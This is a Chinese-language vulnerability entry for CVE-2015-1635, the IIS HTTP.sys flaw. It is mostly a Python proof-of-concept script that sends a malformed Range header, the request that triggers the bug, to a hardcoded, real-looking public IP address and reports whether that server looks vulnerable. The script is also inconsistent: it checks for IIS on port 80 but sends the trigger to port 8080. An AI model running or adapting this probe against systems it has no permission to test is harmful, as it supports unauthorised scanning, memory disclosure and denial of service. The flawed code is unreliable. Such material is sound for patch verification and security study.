# CVE-2015-1635 #
## 受影响版本 ##
Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2
## 平台 ##
windows
## 测试系统 ##
windows
## 类型 ##
远程
## 描述 ##
利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。
## POC ##
<pre class="prettyprit lang-javascript">
import socket
import random
ipAddr = &quot;218.83.157.3&quot;
hexAllFfff = &quot;18446744073709551615&quot;
req1 = &quot;GET / HTTP/1.0\r\n\r\n&quot;
req = &quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-&quot; + hexAllFfff + &quot;\r\n\r\n&quot;
print &quot;[*] Audit Started&quot;
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr, 80))
client_socket.send(req1)
boringResp = client_socket.recv(1024)
if &quot;Microsoft&quot; not in boringResp:
    print &quot;[*] Not IIS&quot;
    exit(0)
client_socket.close()
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((ipAddr,8080))
client_socket.send(req)
goodResp = client_socket.recv(1024)
if &quot;Requested Range Not Satisfiable&quot; in goodResp:
    print &quot;[!!] Looks VULN&quot;
elif &quot; The request has an invalid header name&quot; in goodResp:
    print &quot;[*] Looks Patched&quot;
else:
    print &quot;[*] Unexpected response, cannot discern patch status&quot;
</pre>